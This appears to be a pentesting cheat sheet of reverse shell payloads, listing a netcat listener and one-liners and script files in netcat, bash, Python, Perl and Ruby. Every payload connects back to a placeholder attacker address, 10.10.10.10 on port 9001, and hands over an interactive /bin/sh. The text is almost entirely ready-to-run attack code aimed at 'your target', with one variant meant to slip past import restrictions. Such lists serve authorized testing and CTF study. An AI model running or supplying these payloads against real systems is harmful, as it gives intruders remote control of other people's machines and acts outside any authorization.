# Reverse Shell

- [How To?](#how-to?)
- [Netcat](#netcat)
- [Bash](#bash)
- [Python](#python)
- [Perl](#perl)
- [Ruby](#ruby)
- [PHP](#php)

### How to?

All the reverse shell you found below is use on your target. Also, on your machine please make sure to listen like below:

```
nc -lnvp 9001
```

So while listen you will try to run the listed reverse shell below on your target and hopefully you will get a shell :)

### Netcat

```
# Option 1
nc -e /bin/sh 10.10.10.10 9001

# Option 2
nc 10.10.10.10 9001 -e /bin/sh

# Option 3
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

### Bash

```
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

### Python

When you need to run without a file.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

When you need to run with a file. You can save it as shell.py.
```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

When you only have python3 only.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

When import have been secured.
```
socket = __import__("socket")
subprocess = __import__("subprocess")
os = __import__("os")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Perl

When you need to run without a file.
```
perl -e 'use Socket;$i="10.10.10.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

When you need to run with a file. You can save it as shell.pl.
```
use Socket

$i="10.10.10.10";
$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
```

### Ruby

When you need to run without a file.
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10",9001);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

When you need to run with a file. You can save it as shell.rb
```
require 'socket'

c=TCPSocket.new("10.10.10.10",9001)

while(cmd=c.gets)
    IO.popen(cmd,"r"){
        |io|c.print io.read
    }
end
```